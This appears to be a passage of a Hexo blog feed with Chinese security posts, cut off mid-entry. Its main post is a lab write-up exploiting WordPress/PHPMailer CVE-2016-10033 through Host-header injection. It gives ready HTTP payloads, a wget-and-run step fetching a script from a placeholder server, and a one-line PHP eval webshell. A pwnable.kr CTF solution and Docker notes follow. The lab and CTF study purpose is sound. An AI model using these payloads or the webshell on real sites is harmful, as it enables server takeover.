    <link href="/2018/09/WordPress%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-6-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-PHPMailer-CVE-2016-10033-%E5%AE%9E%E9%AA%8C/"/>
    <url>/2018/09/WordPress%E5%B0%8F%E4%BA%8E%E7%AD%89%E4%BA%8E4-6-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-PHPMailer-CVE-2016-10033-%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>此漏洞利用的是HTTP头部注入，参考资料：<a href="http://www.freebuf.com/articles/web/164817.html">http://www.freebuf.com/articles/web/164817.html</a></p><p>首先放出实验来源：<a href="http://vulapps.evalbug.com/w_wordpress_6/">http://vulapps.evalbug.com/w_wordpress_6/</a></p><p>实验环境需要docker来挂载，docker安装教程：<a href="https://blog.csdn.net/levones/article/details/80474994">https://blog.csdn.net/levones/article/details/80474994</a></p><span id="more"></span><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>WordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer(版本 &lt; 5.2.18)存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>拉取镜像到本地计算机（ubuntu16.04）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker pull medicean/vulapps:w_wordpress_6<br></code></pre></td></tr></table></figure><p>启动实验环境</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">docker run -d -p 8000:80 medicean/vulapps:w_wordpress_6<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/28/C4VEr9.png" alt="C4VEr9.png"></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VeV1.png" alt="C4VeV1.png"></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VAKJ.png" alt="C4VAKJ.png"></p><p>如果上述步骤没有出现错误的话访问ip:port可以看到如下界面：</p><p><img src="https://s1.ax1x.com/2018/05/28/C4VmUx.png" alt="C4VmUx.png"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;touch$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;test&#125;&#125; null)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure><p>将此poc通过burp suite进行重放，IP和端口自行设定。重放前访问<a href="http://ip:port/test时返回404">http://ip:port/test时返回404</a></p><p><img src="https://s1.ax1x.com/2018/05/28/C4VFv4.png" alt="C4VFv4.png"></p><p>重放后再次访问会返回200ok，此时说明POC中执行的命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/touch /var/www/html/test<br></code></pre></td></tr></table></figure><p>执行成功，由此验证了此版本的WordPress存在命令执行漏洞。</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><h3 id="EXP-利用漏洞"><a href="#EXP-利用漏洞" class="headerlink" title="EXP   利用漏洞"></a>EXP   利用漏洞</h3><h4 id="思路一：直接进行命令执行反弹shell"><a href="#思路一：直接进行命令执行反弹shell" class="headerlink" title="思路一：直接进行命令执行反弹shell"></a>思路一：直接进行命令执行反弹shell</h4><p>通过wget下载bash脚本然后执行</p><p>注意事项：</p><ol><li>远程 URL 中不要有 <code>http://</code></li><li>所有字母必须小写</li><li>所有 &#x2F; 用 <code>$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;</code> 代替</li><li>所有 空格 用 <code>$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;</code> 代替</li></ol><p>下载：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/wget --output-document /tmp/rce your_server_ip/example.txt<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce your_server_ip$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;example.txt&#125;&#125; null)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure><p>执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/bin/bash /tmp/rce<br></code></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bash$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;tmp$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;rce&#125;&#125; null)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure><h4 id="思路二：写入webshell再用菜刀连接"><a href="#思路二：写入webshell再用菜刀连接" class="headerlink" title="思路二：写入webshell再用菜刀连接"></a>思路二：写入webshell再用菜刀连接</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/wget --output-document /var/www/html/webshell.php raw.githubusercontent.com/medicean/vulapps/master/w/wordpress/6/webshell.php<br></code></pre></td></tr></table></figure><p>注意事项：</p><ol><li>远程 URL 中不要有 <code>http://</code></li><li>所有字母必须小写</li><li>所有 &#x2F; 用 <code>$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;</code> 代替</li><li>所有 空格 用 <code>$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;</code> 代替</li></ol><p>重放包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/wp-login.php?action=lostpassword</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target(any -froot@localhost -be $&#123;run&#123;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;usr$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;bin$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wget$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;--output-document$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;var$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;www$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;html$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;webshell.php$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;raw.githubusercontent.com$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;medicean$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;vulapps$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;master$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;w$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;wordpress$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;6$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;webshell.php&#125;&#125; null)<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>56<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-pgsql">wp-submit=<span class="hljs-keyword">Get</span>+<span class="hljs-built_in">New</span>+<span class="hljs-keyword">Password</span>&amp;redirect_to=&amp;user_login=<span class="hljs-keyword">admin</span></span><br></code></pre></td></tr></table></figure><p>重放此数据包后网站根目录下多了一个webshell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ant&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>此时可以用菜刀连接发现连接成功。</p><p><img src="https://s1.ax1x.com/2018/05/28/C4VVbR.png" alt="C4VVbR.png"></p>]]></content>
    
    
    <categories>
      
      <category>WEB安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CVE</tag>
      
      <tag>PHP</tag>
      
      <tag>Wordpress</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Ubuntu16.04安装Docker</title>
    <link href="/2018/09/Ubuntu16-04%E5%AE%89%E8%A3%85Docker/"/>
    <url>/2018/09/Ubuntu16-04%E5%AE%89%E8%A3%85Docker/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>因为要使用Docker进行一些web漏洞相关的实验，所以学习了下安装和使用Docker的方法，选用Ubuntu16的原因不必多说，性能稳定，各种第三方支持也比较完善，话不多说，开始动手！</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>首先，先进行更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update<br></code></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C496yt"><img src="https://s1.ax1x.com/2018/05/28/C496yt.png" alt="C496yt.png"></a><br>因为通过curl方式安装可能会出现版本老旧的问题，所以我才用了pip安装的方式</p><span id="more"></span><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install python-pip<br></code></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/C49cOP"><img src="https://s1.ax1x.com/2018/05/28/C49cOP.png" alt="C49cOP.png"></a><br>pip安装成功后，使用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install docker-compose<br></code></pre></td></tr></table></figure><p>来安装docker-compose<br><img src="https://s1.ax1x.com/2018/05/28/C49WTS.png" alt="C49WTS.png"><br>此时系统可能会提示pip版本低，于是按照系统提示进行pip的升级</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">pip install --upgrade pip<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/28/C49yQI.png" alt="C49yQI.png"><br><a href="https://imgchr.com/i/C49Rw8"><img src="https://s1.ax1x.com/2018/05/28/C49Rw8.png" alt="C49Rw8.png"></a><br>pip升级完成后安装docker.io</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt install docker.io<br></code></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2018/05/28/C492ef.png" alt="C492ef.png"><br>大功告成！<br>此时可使用docker info 命令来查看docker信息，但是由于系统权限限制，加上sudo才能正常查看</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo docker info<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客迁移说明</title>
    <link href="/2018/09/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AF%B4%E6%98%8E/"/>
    <url>/2018/09/%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E8%AF%B4%E6%98%8E/</url>
    
    <content type="html"><![CDATA[<p>关于我写博客的历程，我最开始使用的是<code>CSDN</code>，优点是免费，易于维护，但是作为一个伪Geek，我还是很喜欢定制化的个性博客，于是我购买了一台腾讯云的主机用于搭建<code>WordPress</code>博客，在主题选择和插件的丰富上都做了不少的功夫，最终打造了一个页面美观大方功能齐全的个人博客，但是在日常使用过程中发现发布文章的过程十分繁琐而且没有一个良好的版本控制，什么时候博客崩了就什么都没有了，在这个知识就是金钱的时代我是必然要避免这种风险的，于是我选择了<code>Hexo+GithubPage</code>，静态的页面安全性高了很多，而且GitHubPage也是免费的，git也有版本控制，万一手贱点错了我还能找回之前的信息，所以选择了Hexo，目前这个站点上还没有很多的博客，不过我会慢慢的把存储在其他地方的博客迁移到这上面，敬请期待！</p><span id="more"></span><p><img src="https://github.com/Hvnt3r/My_Images/blob/master/20180108192631_BCVS8.gif?raw=true"></p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
    <tags>
      
      <tag>生活</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnable.kr_mistake</title>
    <link href="/2018/09/pwnable-kr-mistake/"/>
    <url>/2018/09/pwnable-kr-mistake/</url>
    
    <content type="html"><![CDATA[<p><strong>题面：</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">We all make mistakes, let&#x27;s move on.<br>(don&#x27;t take this too seriously, no fancy hacking skill is required at all)<br><br>This task is based on real event<br>Thanks to dhmonkey<br><br>hint : operator priority<br><br>ssh mistake@pwnable.kr -p2222 (pw:guest)<br></code></pre></td></tr></table></figure><p>提示这道题的要点是运算符的优先级</p><p>连上服务器后发现题目文件夹下有四个文件</p><span id="more"></span><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mistake@ubuntu:~$ <span class="hljs-built_in">ls</span> -l<br>total 24<br>-r-------- 1 mistake_pwn root      51 Jul 29  2014 flag<br>-r-sr-x--- 1 mistake_pwn mistake 8934 Aug  1  2014 mistake<br>-rw-r--r-- 1 root        root     792 Aug  1  2014 mistake.c<br>-r-------- 1 mistake_pwn root      10 Jul 29  2014 password<br></code></pre></td></tr></table></figure><p>查看一下<code>mistake.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>                                               </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>                                               </span><br>                                                                 <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PW_LEN 10                                                </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> XORKEY 1                                                 </span><br>                                                                 <br><span class="hljs-type">void</span> <span class="hljs-title function_">xor</span><span class="hljs-params">(<span class="hljs-type">char</span>* s, <span class="hljs-type">int</span> len)</span>&#123;                                      <br>        <span class="hljs-type">int</span> i;                                                   <br>        <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;len; i++)&#123;                                    <br>                s[i] ^= XORKEY;                                  <br>        &#125;                                                        <br>&#125;                                                                <br>                                                                 <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span>&#123;                                <br>                                                                 <br>        <span class="hljs-type">int</span> fd;                                                  <br>        <span class="hljs-keyword">if</span>(fd=open(<span class="hljs-string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="hljs-number">0400</span>) &lt; <span class="hljs-number">0</span>)&#123; <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);          <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                        <br>        &#125;                                                        <br>                                                                 <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;do not bruteforce...\n&quot;</span>);                        <br>        sleep(time(<span class="hljs-number">0</span>)%<span class="hljs-number">20</span>);                                       <br>                                                                 <br>        <span class="hljs-type">char</span> pw_buf[PW_LEN+<span class="hljs-number">1</span>];                                   <br>        <span class="hljs-type">int</span> len;                                                 <br>        <span class="hljs-keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="hljs-number">0</span>))&#123;                   <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;read error\n&quot;</span>);                          <br>                close(fd);                                       <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                        <br>        &#125;                                                        <br>                                                                 <br>        <span class="hljs-type">char</span> pw_buf2[PW_LEN+<span class="hljs-number">1</span>];                                  <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input password : &quot;</span>);                             <br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%10s&quot;</span>, pw_buf2);                                  <br>                                                                 <br>        <span class="hljs-comment">// xor your input                                        </span><br>        xor(pw_buf2, <span class="hljs-number">10</span>);                                        <br>                                                                 <br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;                   <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password OK\n&quot;</span>);                         <br>                system(<span class="hljs-string">&quot;/bin/cat flag\n&quot;</span>);                       <br>        &#125;                                                        <br>        <span class="hljs-keyword">else</span>&#123;                                                    <br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Wrong Password\n&quot;</span>);                      <br>        &#125;                                                        <br>                                                                 <br>        close(fd);                                               <br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                                <br>&#125;                                                                <br></code></pre></td></tr></table></figure><p>根据题目的提示<code>运算符</code>我找一些代码中的关键点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(fd=open(<span class="hljs-string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="hljs-number">0400</span>) &lt; <span class="hljs-number">0</span>)&#123; <br>               <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;can&#x27;t open password %d\n&quot;</span>, fd);          <br>               <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;                                        <br>       &#125;      <br></code></pre></td></tr></table></figure><p>在这里由于<code>open()</code>的返回值不会小于0，且<code>&lt;</code>的优先级比<code>=</code>高，所以这句语句的结果是open()的返回值!&lt;0，所以<code>open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0</code>的值为false，因此赋值给fd的时候fd为0，此平台的第一题就是考察的<code>File descriptor</code>，当值为0时执行标准输入，因此实际上代码并不会读password文件，而是等待用户的输入，这就可以让我们来伪造password</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">xor(pw_buf2, <span class="hljs-number">10</span>);                                        <br>      <span class="hljs-comment">//对用户的输入xor                                                         </span><br>      <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;     <span class="hljs-comment">//比较xor后的密码与“原”密码              </span><br>              <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password OK\n&quot;</span>);                         <br>              system(<span class="hljs-string">&quot;/bin/cat flag\n&quot;</span>);                       <br>      &#125;   <br></code></pre></td></tr></table></figure><p>因此我们只需要再fd赋值之后输入自己的10位密码，然后再输入xor后的密码，即可比对成功拿到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mistake@ubuntu:~$ ./mistake<br><span class="hljs-keyword">do</span> not bruteforce...<br>1111111111<br>input password : 0000000000<br>Password OK<br>Mommy, the operator priority always confuses me :(<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018腾讯游戏安全竞赛题目分析</title>
    <link href="/2018/03/2018%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
    <url>/2018/03/2018%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>今年的腾讯游戏安全竞赛就要开始了，但是我对游戏安全这个方向还不太熟悉，因此找了去年的题目来做赛前练习</p><h2 id="资格赛题目"><a href="#资格赛题目" class="headerlink" title="资格赛题目"></a>资格赛题目</h2><h3 id="标准版"><a href="#标准版" class="headerlink" title="标准版"></a>标准版</h3><p>题目一打开长这样：</p><p><img src="https://i.loli.net/2019/03/07/5c810e6a6711e.png"></p><p>赛题说明：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.username与regcode是一一对应的关系，填入正确的username和regcode点击Go按钮出现注册成功提示。<br>2.要求根据CrackMe写出对应注册机，注册机能够根据任意合法用户名生成正确的注册码。<br></code></pre></td></tr></table></figure><p>可以看出这是一个<code>CrackMe</code>程序，开始分析。</p><p><img src="https://i.loli.net/2019/03/07/5c8133abd7eff.png"></p><p>上图为一神器，可直接通过可视化界面获取到MFC组件的响应函数，<a 